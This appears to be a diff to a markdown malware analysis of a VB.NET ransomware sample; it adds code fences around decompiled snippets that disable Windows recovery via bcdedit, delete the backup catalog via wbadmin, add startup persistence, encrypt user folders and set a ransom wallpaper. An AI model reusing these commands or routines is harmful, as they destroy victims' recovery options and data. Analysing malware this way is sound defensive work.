@@ -40,9 +40,12 @@ End Sub
 <details>
     <summary>Code (click to expand/collapse)</summary>
 
+```vb
 Private Shared Sub DisableRecoveryMode()
     Program.runCommand("bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no")
 End Sub
+```	
+
 </details>
 
 ## Delete Backup Catalog:
@@ -52,9 +55,11 @@ End Sub
 <details>
     <summary>Code (click to expand/collapse)</summary>
 
+```vb	
 Private Shared Sub DisableRecoveryMode()
     Program.runCommand("wbadmin delete catalog -quiet")
 End Sub
+```
 
 </details>
 
@@ -63,6 +68,8 @@ End Sub
 	For persistence
 <details>
     <summary>Code (click to expand/collapse)</summary>
+
+```vb
 Private Shared Sub AddLinkToStartup()
 	Dim folderPath As String = Enviroment.GetFolderPath(Enviroment.SpecialFolder.Startup)
 	Dim str As String = Process.GetCurrentProcess().ProcessName
@@ -75,6 +82,7 @@ Private Shared Sub AddLinkToStartup()
 		streamWriter.WriteLine("IconFile=" + str2)
 		End Using
 End Sub
+```
 
 </details>
 
@@ -102,6 +110,7 @@ End Sub
 <details>
     <summary>Code (click to expand/collapse)</summary>
 
+```vb
 Dim location As String = Program.userDir + Program.userName + "\Desktop"
 Dim location2 As String = Program.userDir + Program.userName + "\Links"
 Dim location3 As String = Program.userDir + Program.userName + "\Contacts"
@@ -128,7 +137,9 @@ Program.encryptDirectory(location10)
 Program.encryptDirectory(location11)
 Program.encryptDirectory(location12)
 Program.encryptDirectory(location13) 
-## !Dump! He Could Do It With For Loop !
+```
+### !Dump! He Could Do It With For Loop !
+
 </details>
 
 ## Set Wallpaper:
@@ -138,6 +149,7 @@ Program.encryptDirectory(location13)
 <details>
     <summary>Code (click to expand/collapse)</summary>
 
+```vb
 Public Shared Sub SetWallpaper(base64 As string)
   if base64 <> "" Then
     Try
@@ -148,6 +160,7 @@ Public Shared Sub SetWallpaper(base64 As string)
     End Try
   End If
 End Sub
+```
 
 </details>
 	
